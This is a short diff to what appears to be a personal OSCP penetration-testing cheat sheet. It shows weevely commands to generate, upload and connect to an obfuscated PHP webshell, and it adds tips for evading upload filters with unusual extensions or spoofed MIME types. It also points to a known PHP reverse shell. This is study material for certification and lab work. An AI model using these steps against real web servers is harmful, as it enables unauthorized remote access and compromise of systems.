@@ -872,6 +872,11 @@ https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
 weevely generate password1234 shell.php      (upload this obfuscated webshell)
 (then run) weevely http://xx.xx.xx.xx/app/uploads/shell.php    (enjoy your shell!)
 
+pentestmonkey has a great php reverse shell
+
+sometimes web apps filter php uploads, you can sometimes bypass them using lesser known extensions like .pht, 
+or use burpsuite/tamper and change the MIME type to something acceptable (octet-stream, pdf, etc)
+
 
 OSCP post-exp checklists:
         **Win:
